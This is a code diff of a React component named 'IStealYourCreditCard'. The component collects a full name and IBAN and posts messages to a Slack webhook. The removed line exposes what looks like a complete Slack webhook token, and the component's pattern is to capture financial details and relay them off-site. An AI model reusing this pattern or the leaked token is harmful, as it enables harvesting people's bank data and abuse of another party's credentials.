@@ -3,6 +3,8 @@ import {useState} from "react";
 
 function IStealYourCreditCard() {
 
+    const SLACK_WEBHOOK = import.meta.env.VITE_SLACK_WEBHOOK_URL;
+
     const [formData, setFormData] = useState({
         fullName: '',
         iban: '',
@@ -18,7 +20,7 @@ function IStealYourCreditCard() {
     }
 
     async function sendToSlack(message: string) {
-        const response = await fetch('https://hooks.slack.com/services/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', {
+        const response = await fetch(SLACK_WEBHOOK, {
             method: 'POST',
             headers: {'Content-Type': 'text/plain'},
             body: JSON.stringify({text: message}),
